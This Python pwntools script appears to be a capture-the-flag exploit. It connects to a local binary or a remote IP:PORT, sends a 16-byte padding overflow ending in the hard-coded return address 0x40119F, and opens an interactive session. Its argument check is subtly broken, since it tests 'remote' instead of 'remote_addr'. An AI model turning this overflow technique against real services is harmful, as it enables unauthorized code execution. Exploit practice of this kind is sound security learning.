#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
import sys, getopt

context(arch = 'amd64', os = 'linux', log_level = 'error')
libc = ''
remote_addr = ''
binary = ''

def usage():
    print('''Usage: ./p.py -o -d -r --libc
    Requred args:
    -o Path to a local executable.
    -r Connect to IP:PORT if arg -o not given.
    Optimal args:
    -d Debug.
    --libc Path to a specific libc''')

def getarg(argv):
    global context
    global libc
    global remote_addr
    global binary
    try:
        opts, args = getopt.getopt(argv, 'hdr:o:', ['help', 'libc='])
        for opt, arg in opts:
            if opt in ('-h', '--help'):
                usage()
                sys.exit(2)
            elif opt in '-d':
                context.log_level = 'debug'

            elif opt in '-o':
                binary = arg
            elif opt in '-r':
                remote_addr = arg
            elif opt in ('--libc'):
                libc = arg
    except getopt.GetoptError:
        usage()
        sys.exit(2)
    if not binary and not remote:
        usage()
        sys.exit(2)

if __name__ == "__main__":
    getarg(sys.argv[1:])
    if not binary:
        remote_addr = remote_addr.split(':')
        p = remote(remote_addr[0], remote_addr[1])
    else :
        p = process(binary,  env={'LD_PRELOAD':libc})

    p.sendline(b'A' * 16 + p64(0x40119F));
    p.interactive()
